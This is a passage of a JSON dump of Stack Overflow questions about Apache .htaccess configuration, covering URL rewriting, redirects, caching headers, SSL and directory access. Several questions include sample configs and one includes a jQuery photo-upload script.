</p>\n"},{"tags":["php","apache",".htaccess","seo","search-engine"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":232,"score":2,"question_id":6102129,"title":"Search-Engine Friendly URLs","body":"<p>I am working on building my first search-engine friendly CMS. I know that perhaps one of the biggest keys to having and SEO site is to have search-engine friendly URLs. So having a link like this:</p>\n\n\n\n<pre class=\"lang-none prettyprint-override\"><code>http://www.mysite.com/product/details/page1\n</code></pre>\n\n<p>will result in much better rankings than one like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>http://www.mysite.com/index.php?pageID=37\n</code></pre>\n\n<p>I know that to create URLs like the first one, I have one of two options:</p>\n\n<ul>\n<li>use a web technology, in this case PHP, to create a directory structure</li>\n<li>leverage Apache's <code>mod_rewrite</code> add-on to have these URLs passed to a PHP processor</li>\n</ul>\n\n<p>As far as the PHP goes, I'm pretty comfortable with anything. However, I think the first option would be more difficult to maintain.</p>\n\n<p>Could someone show me how to write an <code>.htaccess</code> file, which will:</p>\n\n<ul>\n<li>silently direct SEO URLs to a processor script</li>\n<li>not redirect if the requested URL is an actual directory on the server</li>\n</ul>\n\n<p>Is there a better way than the way I am trying it?</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12655624,"title":"Got stuck in a very basic .htaccess rewrite","body":"<pre><code>&lt;h1&gt;&lt;a href=\"profile.php?id=' . $id . '\" target=\"_self\"&gt;' . $name. '&lt;/a&gt;&lt;/h1&gt;\n</code></pre>\n\n<p>The above is the reference which points to my profile1.php file. This file is called index.php . It currently displays the urls as this:</p>\n\n<p><a href=\"http://www.domain.com/interact/profile1.php?id=36\" rel=\"nofollow\">http://www.domain.com/interact/profile1.php?id=36</a></p>\n\n<p>I have tried implementing the .htaccess file to rewrite the url. I tried many combinations and most of them gave a 500 error and some did not rewrite the url.\nThis is the .htaccess file which I use, it does not make the url to change.</p>\n\n<p>I want the url to look like <a href=\"http://www.domain.com/interact/profile/36\" rel=\"nofollow\">http://www.domain.com/interact/profile/36</a></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ profile1.php/$1 [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I know this is a very basic question but I seem to stuck in it and have read basic tutorials but am not able to implement it properly.</p>\n\n<p>The files index.php ,profile1.php and .htaccess are in folder named interact.</p>\n\n<p>Tell me any changes required in php or .htaccess files. </p>\n"},{"tags":["html",".htaccess","url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12653593,"title":".htaccess url rewrite won't work","body":"<p>So I am trying to rewrite:</p>\n\n<p>url.com/edit_note.php?noteid=243</p>\n\n<p>to</p>\n\n<p>url.com/n/243</p>\n\n<p>I am using this:</p>\n\n<pre><code>RewriteEngine On \nRewriteRule /n/(.*)$ /edit_note.php?noteid=$1 \n</code></pre>\n\n<p>Any ideas as to why this isn't working?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12159449,"title":"Apache mod rewrite, DirectorySlash Off root fix (seeing index of)","body":"<p>I'm very unfortunately stuck here.\nI did a htaccess redirect for clean url. But whenever I had a path that corresponded to an existing directory, a backslash would be added which was very annoying and produced error in my script.</p>\n\n<p>So I changed the DirectorySlash option to Off and it beautifully fixed my problem. Yes I am aware of the security warning and de-activated indexes.</p>\n\n<p>Now my big problem is as follow: I cannot redirect to my index.php if the path to the website is entered WITHOUT the trailing slash because the REQUEST_URI is empty.</p>\n\n<p>so,\"www.my-website.com/\" will work but \"www.my-website.com\" will not.</p>\n\n<p>I thought to myself \"well I'll just detect if the REQUEST is empty\". nothing happens. Or mayble turn off directoryslash for subfolders only? \nAfter hours of searching, I found that the following did work but meant I had to write the url in hard and that really not optimal</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\n  #prevent from weird bug if path is a directory\nDirectorySlash Off\n\n  # add the trailing slash to root directory\n  # THIS IS WHERE I NEED A VARIABLE PATH THAT I DON'T NEED TO CHANGE MANUALY\nRedirectMatch ^/?([^\\.\\/]+)$ http://my-fixed-url.com/$1/\n\n  # Don't show directory indexes (the listing of files)\nOptions -Indexes -MultiViews\n\n  # as long is it isn't an existing file\nRewriteCond %{REQUEST_FILENAME} !-f\n\n  # Then redirect to index.php with the param \"path\" set to the url\nRewriteRule ^([a-zA-Z0-9\\_\\-\\/\\.]+)$ index.php?path=$1 [QSA]\n</code></pre>\n\n<p>Any help is deeply appreciated!</p>\n"},{"tags":["php",".htaccess","mod-rewrite","markdown"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12652656,"title":"Hide file extension with htaccess ","body":"<p>I'm not the best with mod rewrite so if anybody can help me out here that would be great.</p>\n\n<p>I'm using a markdown processor script and it's using rewrite to grab any files that end with a markdown file type. However, I'd like this script to grab any files within a folder, rather than any files that end with the markdown file type.</p>\n\n<p>Here's the <code>htaccess</code>:</p>\n\n<pre><code># display Markdown as HTML by default\nRewriteEngine on\n\nRewriteRule .+\\.(markdown|mdown|md|mkd)$ /static/includes/markdown/render.php\nRewriteRule .+\\.(markdown|mdown|md|mkd)\\-text$ /static/includes/markdown/render.php [L]\n</code></pre>\n\n<p>Is there a way to grab all files within a folder called (let's say) \"folder\" and eliminate the file type on the end?</p>\n\n<p>So maybe have a URL like </p>\n\n<pre><code>website.com/home \n</code></pre>\n\n<p>that actually is </p>\n\n<pre><code>website.com/home.md\n</code></pre>\n\n<p>and is processed with the markdown script?</p>\n\n<p>Hope this makes sense.</p>\n"},{"tags":[".htaccess","caching","safari"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":814,"score":5,"question_id":3422599,"title":"Safari seems to ignore cache settings when user hits back with mouse or keyboard","body":"<p>I have a page where once a button is clicked, it is replaced by an Ajax spinner whilst the user waits for the next page to load.</p>\n\n<p>I am controlling (or attempting to control) caching using .htaccess. If the user hits back (browser button, mouse button, alt+left, backspace) it needs to reload the page from the cache. IEs 6-8 and Chrome were all fine with this. Firefox wasn't working for a while and recently started to work, but the problem seems to be remaining in Safari. This seems a little odd, because I'd have expected Safari and Chrome to behave in the same way.</p>\n\n<p>This is my .htaccess file:</p>\n\n<pre><code># Add Proper MIME-Type for Favicon\nAddType image/x-icon .ico\n\n&lt;IfModule mod_expires.c&gt;\n    ExpiresActive On\n#   ExpiresDefault A2630000\n    ExpiresByType image/x-icon A2630000\n    ExpiresByType image/gif A2630000\n    ExpiresByType image/jpeg A2630000\n    ExpiresByType image/png A2630000\n    ExpiresByType application/x-javascript M2630000\n    ExpiresByType application/javascript M2630000\n    ExpiresByType text/css M2630000\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_headers.c&gt;\n    Header set Cache-Control \"public\"\n    &lt;FilesMatch \"\\.php$\"&gt;\n        Header set Cache-Control \"no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0\"\n    &lt;/FilesMatch&gt;\n&lt;/IfModule&gt;\n\nSetOutputFilter DEFLATE\n\nAddOutputFilterByType DEFLATE text/css\nAddOutputFilterByType DEFLATE application/javascript\n</code></pre>\n\n<p>I've tried it with and without the Cache-Control public line.</p>\n\n<p>I've also tried adding:</p>\n\n<pre><code>AddType application/x-httpd-php .php\n</code></pre>\n\n<p>with:</p>\n\n<pre><code>ExpiresByType application/x-httpd-php A0\n</code></pre>\n\n<p>To no avail.</p>\n\n<p>Am I missing something obvious?</p>\n\n<p>Edit: I don't think it's anything to do with the cache settings.</p>\n\n<p>I've tried adding this to the PHP itself:</p>\n\n<pre><code>#safari test\nif (strstr($_SERVER['HTTP_USER_AGENT'],'Safari')){\n    header(\"Cache-Control: no-cache, must-revalidate\"); // HTTP/1.1\n    header(\"Expires: Sat, 26 Jul 1997 05:00:00 GMT\"); // Date in the past\n}\n</code></pre>\n\n<p>And even without those lines I can see in \"inspect element\" > resources that the right headers are being received. The problem seems to be what Safari is doing with them in its bid to be \"the fastest browser\". It would appear that it explicitly ignores what the site developers specificy - this sounds like IE's original mindset from back in the day when tables where used for layouts.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":11278811,"title":"rewrite www. to non www without specifying the domain?","body":"<p>I was using this code to remove www from my domain:</p>\n\n<pre><code># remove www\nRewriteCond %{HTTP_HOST} ^www.example.com$ [NC]\nRewriteRule ^(.*)$ http://example.com/$1 [R=301,L]\n</code></pre>\n\n<p>My problem is that I usually use subdomains and it doesn't work for them. (www.sub.example.com).</p>\n\n<p>How do I rewrite to remove www whatever the domain is and even if it has subdomains?</p>\n"},{"tags":[".htaccess","http","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12650636,"title":"How to fake a url?","body":"<p>I have a url as <code>http://mydomain.com/levels/home?mode=48bb6e862e54f2a795ffc4e541caed4d</code>.</p>\n\n<p>I need to make fake url of above url. When I type a url <code>http://mydomain.com/medium</code> in address bar of browser, request needs to go in  url <code>http://mydomain.com/levels/home?mode=48bb6e862e54f2a795ffc4e541caed4d</code>, but address bar will need to show this url <code>http://mydomain.com/medium</code> itself.</p>\n\n<p>How can we do this with .htaccess file?</p>\n\n<p>EDIT:</p>\n\n<p>I tried with </p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule ^medium.*$ /levels/home?mode=48bb6e862e54f2a795ffc4e541caed4d [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php [QSA,L]\n</code></pre>\n\n<p>But this will redirect to original url <code>/levels/home?mode=48bb6e862e54f2a795ffc4e541caed4d</code> and showing this url instead of <code>/medium</code> url in address bar.</p>\n"},{"tags":[".htaccess","mobile","subdomain","cname"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":10818189,"title":"mobile website format","body":"<p>I am looking to build a mobile website to my current website and needed some guidance with a few things:</p>\n\n<ol>\n<li>Is it possible to put all my mobile files in a folder called mobile then set .htaccess to redirect url with prefix m. to the folder?</li>\n<li>Is it also possible to hide the a subfolder name from the url so instead of www.website.com/folder/index.php to have m.website.com/index.php?</li>\n<li>Are there any processor downfalls from using .htaccess excessively?</li>\n</ol>\n\n<p>Much appreciated if anyone can explain these pointers.</p>\n\n<p>Thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":12649672,"title":"Single case - dynamic to static page using modrewrite in htacess","body":"<p>I have one dynamic page: </p>\n\n<pre><code>http://blog.mysite.com/?p=25\n</code></pre>\n\n<p>and with htaccess and modrewrite, I want to change it to:</p>\n\n<pre><code>http://www.mysite.com/stuff/newhome.html\n</code></pre>\n\n<p>I know it can't be that hard but this one has me stumped, any and all help will be greatly appreciated.</p>\n\n<h1>EDIT</h1>\n\n<p>I tried:</p>\n\n<pre><code>RewriteRule ^p=25 mysite.com/stuff/newhome.html [QSA,R=301,L]\n</code></pre>\n\n<p>Along with variations but no success.</p>\n"},{"tags":["apache",".htaccess","caching","cache-control"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12617174,"title":".htaccess cache-control doesn't cache my files (js|png|css etc.)","body":"<p>As my title says, I am trying to cache-control the content on my website but it seems that my content isn't being cached.</p>\n\n<p>This is my code in my .htaccess file:</p>\n\n<pre><code>Header unset Pragma\nFileETag None\nHeader unset ETag\n\n# cache images/pdf docs for 10 days\n&lt;FilesMatch \"\\.(ico|pdf|jpg|jpeg|png|gif|js)$\"&gt;\nHeader set Cache-Control \"max-age=864000, public, must-revalidate\"\nHeader unset Last-Modified\n&lt;/FilesMatch&gt;\n\n# cache html/htm/xml/txt diles for 2 days\n&lt;FilesMatch \"\\.(html|htm|xml|txt|xsl)$\"&gt;\nHeader set Cache-Control \"max-age=7200, must-revalidate\"\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>Link to my website if needed: <a href=\"http://awesomephp.nl/\" rel=\"nofollow\">http://www.awesomephp.nl/</a></p>\n\n<p>I have tried a lot of tutorials but none of them seems to do the trick.\nBy the way, other .htaccess codes, like redirecting and stuff, DOES work.</p>\n\n<p>EDIT: I just removed \"Header unset Last-Modified\" and my code worked!!</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12647644,"title":"htaccess error on mysql_auth","body":"<p>i am using the code for mysql_auth in htaccess but is not working can anyone help me out with the right details .</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n\nAuthMYSQLEnable on\nAuthName \"Members Only\"\nAuthType Basic\nAuthGroupFile /dev/null\nAuthMySQLHost localhost\nAuthMySQLDB boo\nAuthMySQLUser boo\nAuthMySQLPassword 1234567\nAuthMySQLUserTable member_auth\nAuthMySQLNameField username\nAuthMySQLPasswordField password\nAuthMySQLPwEncryption none\nAuthMySQLUserCondition \"siteid=1 AND username != '' AND password != ''\"\nrequire valid-user\n</code></pre>\n\n<p>its giving out the error</p>\n\n<blockquote>\n  <p>The server encountered an internal error or misconfiguration and was\n  unable to complete your request.</p>\n</blockquote>\n"},{"tags":["javascript","ajax",".htaccess","hash","slash"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12648001,"title":"htaccess screwed Ajax hash # mark","body":"<p>I have pretty much standard rule that's adding slash to the end of the URL:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_URI} !(.*)/$\nRewriteRule ^(.*[^/])$ $1/ [R=301,L]\n</code></pre>\n\n<p>Ajax photo gallery is making some additions with hash # to the URL like <code>URL/#photoset_photo_empty_progress</code>. I can't understand what htaccess blocks or does to hash string. But it screws this and gallery stops to work.</p>\n\n<p>My thoughts are maybe it needs here some magic with htaccess to avoid this rule to be apply to hash string.</p>\n\n<p>Please give me a solution because I can't even understand what's going wrong there.</p>\n\n<hr>\n\n<pre><code>var ls = ls || {};\n\nls.photoset =( function ($) {\n\n    this.idLast=0;\n    this.isLoading=false;\n    this.swfu;\n\n    this.initSwfUpload = function(opt) {\n        opt=opt || {};\n        opt.button_placeholder_id = 'photoset-start-upload';\n        opt.post_params.ls_photoset_target_tmp = $.cookie('ls_photoset_target_tmp') ? $.cookie('ls_photoset_target_tmp') : 0;\n\n        $(ls.swfupload).unbind('load').bind('load',function() {\n            this.swfu = ls.swfupload.init(opt);\n\n            $(this.swfu).bind('eUploadProgress',this.swfHandlerUploadProgress);\n            $(this.swfu).bind('eFileDialogComplete',this.swfHandlerFileDialogComplete);\n            $(this.swfu).bind('eUploadSuccess',this.swfHandlerUploadSuccess);\n            $(this.swfu).bind('eUploadComplete',this.swfHandlerUploadComplete);\n        }.bind(this));\n\n        ls.swfupload.loadSwf();\n    }\n\n    this.swfHandlerUploadProgress = function(e, file, bytesLoaded, percent) {\n        $('#photoset_photo_empty_progress').text(file.name+': '+( percent==100 ? 'resize..' : percent +'%'));\n    }\n\n    this.swfHandlerFileDialogComplete = function(e, numFilesSelected, numFilesQueued) {\n        if (numFilesQueued&gt;0) {\n            ls.photoset.addPhotoEmpty();\n        }\n    }\n\n    this.swfHandlerUploadSuccess = function(e, file, serverData) {\n        ls.photoset.addPhoto(jQuery.parseJSON(serverData));\n    }\n\n    this.swfHandlerUploadComplete = function(e, file, next) {\n        if (next&gt;0) {\n            ls.photoset.addPhotoEmpty();\n        }\n    }\n\n    this.addPhotoEmpty = function() {\n        template = '&lt;li id=\"photoset_photo_empty\"&gt;&lt;img src=\"'+DIR_STATIC_SKIN + '/images/loader.gif'+'\" alt=\"image\" style=\"margin-left: 35px;margin-top: 20px;\" /&gt;'\n                    +'&lt;div id=\"photoset_photo_empty_progress\" style=\"height: 60px;width: 350px;padding: 3px;border: 1px solid #DDDDDD;\"&gt;&lt;/div&gt;&lt;br /&gt;&lt;/li&gt;';\n        $('#swfu_images').append(template);\n    }\n\n    this.addPhoto = function(response) {\n        $('#photoset_photo_empty').remove();\n        if (!response.bStateError) {\n            template = '&lt;li id=\"photo_'+response.id+'\"&gt;&lt;img src=\"'+response.file+'\" alt=\"image\" /&gt;'\n                        +'&lt;textarea onBlur=\"ls.photoset.setPreviewDescription('+response.id+', this.value)\"&gt;&lt;/textarea&gt;&lt;br /&gt;'\n                        +'&lt;a href=\"javascript:ls.photoset.deletePhoto('+response.id+')\" class=\"image-delete\"&gt;'+ls.lang.get('topic_photoset_photo_delete')+'&lt;/a&gt;'\n                        +'&lt;span id=\"photo_preview_state_'+response.id+'\" class=\"photo-preview-state\"&gt;&lt;a href=\"javascript:ls.photoset.setPreview('+response.id+')\" class=\"mark-as-preview\"&gt;'+ls.lang.get('topic_photoset_mark_as_preview')+'&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;';\n            $('#swfu_images').append(template);\n            ls.msg.notice(response.sMsgTitle,response.sMsg);\n        } else {\n            ls.msg.error(response.sMsgTitle,response.sMsg);\n        }\n        ls.photoset.closeForm();\n    }\n\n    this.deletePhoto = function(id)\n    {\n        if (!confirm(ls.lang.get('topic_photoset_photo_delete_confirm'))) {return;}\n        ls.ajax(aRouter['photoset']+'deleteimage', {'id':id}, function(response){\n            if (!response.bStateError) {\n                $('#photo_'+id).remove();\n                ls.msg.notice(response.sMsgTitle,response.sMsg);\n            } else {\n                ls.msg.error(response.sMsgTitle,response.sMsg);\n            }\n        });\n    }\n\n    this.setPreview =function(id)\n    {\n        $('#topic_main_photo').val(id);\n\n        $('.marked-as-preview').each(function (index, el) {\n            $(el).removeClass('marked-as-preview');\n            tmpId = $(el).attr('id').slice($(el).attr('id').lastIndexOf('_')+1);\n            $('#photo_preview_state_'+tmpId).html('&lt;a href=\"javascript:ls.photoset.setPreview('+tmpId+')\" class=\"mark-as-preview\"&gt;'+ls.lang.get('topic_photoset_mark_as_preview')+'&lt;/a&gt;');\n        });\n        $('#photo_'+id).addClass('marked-as-preview');\n        $('#photo_preview_state_'+id).html(ls.lang.get('topic_photoset_is_preview'));\n    }\n\n    this.setPreviewDescription = function(id, text)\n    {\n        ls.ajax(aRouter['photoset']+'setimagedescription', {'id':id, 'text':text},  function(result){\n            if (!result.bStateError) {\n\n            } else {\n                ls.msg.error('Error','Please try again later');\n            }\n        }\n        )\n    }\n\n    this.getMore = function(topic_id)\n    {\n        if (this.isLoading) return;\n        this.isLoading=true;\n\n        ls.ajax(aRouter['photoset']+'getmore', {'topic_id':topic_id, 'last_id':this.idLast}, function(result){\n            this.isLoading=false;\n            if (!result.bStateError) {\n                if (result.photos) {\n                    $.each(result.photos, function(index, photo) {\n                        var image = '&lt;li&gt;&lt;a class=\"photoset-image\" href=\"'+photo.path+'\" rel=\"[photoset]\" title=\"'+photo.description+'\"&gt;&lt;img src=\"'+photo.path_thumb+'\" alt=\"'+photo.description+'\" /&gt;&lt;/a&gt;&lt;/li&gt;';\n                        $('#topic-photo-images').append(image);\n                        this.idLast=photo.id;\n                        $('.photoset-image').unbind('click');\n                        $('.photoset-image').prettyPhoto({\n                            social_tools:'',\n                            show_title: false,\n                            slideshow:false,\n                            deeplinking: false\n                        });\n                    }.bind(this));\n                }\n                if (!result.bHaveNext || !result.photos) {\n                    $('#topic-photo-more').remove();\n                }\n            } else {\n                ls.msg.error('Error','Please try again later');\n            }\n        }.bind(this));\n    }\n\n    this.upload = function()\n    {\n        ls.photoset.addPhotoEmpty();\n        ls.ajaxSubmit(aRouter['photoset']+'upload/',$('#photoset-upload-form'),function(data){\n            if (data.bStateError) {\n                $('#photoset_photo_empty').remove();\n                ls.msg.error(data.sMsgTitle,data.sMsg);\n            } else {\n                ls.photoset.addPhoto(data);\n            }\n        });\n        ls.photoset.closeForm();\n    }\n\n    this.closeForm = function()\n    {\n        $('#photoset-upload-form').jqmHide();\n    }\n\n    this.showForm = function()\n    {\n        var $select = $('#photoset-start-upload');\n        if ($select.length) {\n            var pos = $select.offset();\n            w = $select.outerWidth();\n            h = $select.outerHeight();\n            t = pos.top + h - 30  + 'px';\n            l = pos.left - 15 + 'px';\n            $('#photoset-upload-form').css({'top':t,'left':l});\n        }\n        $('#photoset-upload-form').show();\n    }\n\n    this.showMainPhoto = function(id) {\n        $('#photoset-main-preview-'+id).css('width',$('#photoset-main-image-'+id).outerWidth());\n        $('#photoset-photo-count-'+id).show();\n        $('#photoset-photo-desc-'+id).show();\n    }\n\n    return this;\n}).call(ls.photoset || {},jQuery);\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16,"score":1,"question_id":12647545,"title":"using mod_rewrite to strip out junk","body":"<p>We're seeing some really weird URLs in our logs and I've been told to start redirecting them. \nI know of a couple of better ways to go about fixing this, but the boss wants it done this way. I apologize in advance.</p>\n\n<p>We're seeing stuff like the following in our logs:</p>\n\n<p><a href=\"http://www.example.com/foo/bar/bla&amp;ob=&amp;ppg=&amp;rpp=100&amp;ob=&amp;rpp=&amp;ppg=&amp;rpp=30&amp;ppg=&amp;ppg=1&amp;rpp=10&amp;rpp=50&amp;ob=&amp;ob=&amp;ob=&amp;rpp=40&amp;ob=&amp;rpp=5&amp;rpp=30&amp;rpp=&amp;rpp=20&amp;order_by=&amp;results_per_pge=75\" rel=\"nofollow\">http://www.example.com/foo/bar/bla&amp;ob=&amp;ppg=&amp;rpp=100&amp;ob=&amp;rpp=&amp;ppg=&amp;rpp=30&amp;ppg=&amp;ppg=1&amp;rpp=10&amp;rpp=50&amp;ob=&amp;ob=&amp;ob=&amp;rpp=40&amp;ob=&amp;rpp=5&amp;rpp=30&amp;rpp=&amp;rpp=20&amp;order_by=&amp;results_per_pge=75</a></p>\n\n<p>I've been told to 'toss some mod_rewrite rules in the .htaccess file' to take this and strip out all the ob, rpp, and ppg variables.</p>\n\n<p>Now, I've found ways to strip everything out. And that wouldn't be too bad if I could leave the /foo/bar/bla in there. But I can't seem to do that. Basically, any help would be appreciated.</p>\n"},{"tags":[".htaccess","passwords","cron"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12644728,"title":"remove .htaccess password using time variable","body":"<p>I have the following in my .htaccess to password protect a website:</p>\n\n<pre><code>    AuthUserFile /home/sites/site.com/current/public/.htpasswd\n    AuthType Basic\n    AuthName \"My Secret Folder\"\n    Require valid-user\n</code></pre>\n\n<p>I want to conditionally set this depending on the time of site launch...something like:</p>\n\n<pre><code>if (time &gt; 2012/09/30 9pm PST):\n\n    AuthUserFile /home/sites/site.com/current/public/.htpasswd\n    AuthType Basic\n    AuthName \"My Secret Folder\"\n    Require valid-user\n\nendif;\n</code></pre>\n\n<p>the above is obviously pseudo code.  Anyone have any thoughts?</p>\n\n<p>EDIT:\nmake sure you are running Apache Version 2.4 and up. to check run:</p>\n\n<pre><code>httpd -V\n</code></pre>\n\n<p>time variables requires Apache 2.4 and up.</p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12397120,"title":"htaccess rewrite to remove part of a url","body":"<p>I can't find the answer so I'm hopeful someone can help.  </p>\n\n<p>How do I change the url in this example using .htaccess:</p>\n\n<pre><code>domain.com/product/sku/a=code&amp;rss=1\n</code></pre>\n\n<p>to</p>\n\n<pre><code>domain.com/product/sku/a=code\n</code></pre>\n\n<p>(I just need the <code>&amp;rss=1</code> removed)</p>\n\n<p>Thanks so much in advance.</p>\n"},{"tags":[".htaccess","mod-rewrite","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":53,"score":0,"question_id":12644319,"title":"mod_rewrite SSL with other Rules Active","body":"<p>I'm having issues with my mod_rewrite to SSL while keeping my other rules. I need all pages to be on SSL, but by adding the rule it created a redirect loop.</p>\n\n<p>Here is what I have so far:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^domain.com$\nRewriteRule (.*) https://www.domain.com/ [R=301]\n\nRewriteCond %{HTTPS} off\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}\n\nRewriteBase /\n\n# Sign up\nRewriteRule ^sign-up/$ /register.php [NC]\n</code></pre>\n\n<p>Where could I be going wrong here? I've tried changing the order of the riles but had no luck.</p>\n\n<p>Cheers,\nRJ</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12643060,"title":"rewrite all requests from one folder to a parent folder htaccess","body":"<p>This one has me stumped, I need to re-write all requests to the javascript folder (js) to a special library handler system.</p>\n\n<p>e.g.</p>\n\n<pre><code>rewrite http://localhost/admin/js/bar.js  --&gt; http://localhost/_lib/=admin/js/bar.js\n</code></pre>\n\n<p>Any ideas?  I have tried the following which creates an error</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^(.*)$\nRewriteRule ^(.*)$ /%1/_lib/$1 [NC]\n\n(36)File name to long: cannot map GET /admin/js/bar.js to file\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16,"score":1,"question_id":12643036,"title":"Replacing Segment with mod rewrite in .htacces","body":"<p>I'm trying to change this URL:</p>\n\n<pre><code>domain.com/?ACT=52&amp;id=28\n</code></pre>\n\n<p>to this one:</p>\n\n<pre><code>domain.com/site.html\n</code></pre>\n\n<p>I want to replace the last segment <code>?ACT=52&amp;id=28</code> to <code>site.html</code>. There are no parameters to consider. The URL <code>domain.com/?ACT=52&amp;id=28</code> will always be the same.</p>\n"},{"tags":[".htaccess","directory"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12646668,"title":"allow access to certain directories in htaccess","body":"<p>In htaccess I am blocking directory browsing by using the following code.</p>\n\n<pre><code># directory browsing\nOptions All -Indexes\n</code></pre>\n\n<p>However, I want people to have access to a certain folder, let's say the folder is called pictures, so the folder is at mysite.com/pictures. </p>\n\n<p>How do I give access to that folder/directory, but keep the rest blocked?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","dns","subfolder"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12592723,"title":"redirect domains and subfolder to new domain htaccess","body":"<p>I have 4 domain which I want 3 of them redirect to last one. I already used some htaccess rules and they are working great, </p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{HTTP_HOST} ^first.com$ [NC]\nRewriteRule ^(.*) http://www.forth.com/$1 [L,R=301]\n\nRewriteCond %{HTTP_HOST} ^www.first.com [NC]\nRewriteRule ^(.*)$ http://www.forth.com/$1 [L,R=301]\n\nRewriteCond %{HTTP_HOST} ^second.com [NC]\nRewriteRule ^(.*)$ http://www.forth.com/$1 [L,R=301]\n\nRewriteCond %{HTTP_HOST} ^www.second.com [NC]\nRewriteRule ^(.*)$ http://www.forth.com/$1 [L,R=301]\n\nRewriteCond %{HTTP_HOST} ^www.third.com [NC]\nRewriteRule ^(.*)$ http://www.forth.com/$1 [L,R=301]\n\nRewriteCond %{HTTP_HOST} ^third.com [NC]\nRewriteRule ^(.*)$ http://www.forth.com/$1 [L,R=301]\n</code></pre>\n\n<p>the only problem is when I enter \"www.first.com/about\" it does not shows \"www.forth.com/about\" just shows the same thing . all the domain are forwarded to forth.com and they do not have hosting so I cannot put htaccess file for those other domains , please guide. would be appreciated.</p>\n"},{"tags":[".htaccess","redirect","wildcard"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":52,"score":-1,"question_id":12640317,"title":".htaccess wildcard redirect 301","body":"<p>i have to redirect many urls</p>\n\n<p>the structure is this:</p>\n\n<p>OLD URL</p>\n\n<pre><code>/category/product-18-name.aspx\n</code></pre>\n\n<p>NEW URL</p>\n\n<pre><code>product18name.php (is merely an example)\n</code></pre>\n\n<p>i wish to do a regex, if a user type <code>/anyword/product-18-name.aspx</code> i wish that user will go to <code>product18name.php</code></p>\n\n<p>in short, i wish that the word in the middle of 2 first slashes, example: <code>/category/</code> that maybe a real category or any word to go to right page</p>\n\n<p>so a user that type: <code>/helloworld/product-18-name.apsx</code> goes to <code>product18name.php</code>\nor <code>/sdjfkskfdns/product-18-name.apsx</code> goes to <code>product18name.php</code></p>\n\n<p>Now my .htaccess is full of 301 redirects, like</p>\n\n<pre><code>Redirect 301 /electronic/peacemaker2_a5f89948-9f15-4606-9d5c-051d84a4c070.aspx http://www.site.com/product.php?id_product=23580\n</code></pre>\n\n<p>any help ? thanks</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":10061978,"title":"htaccess with 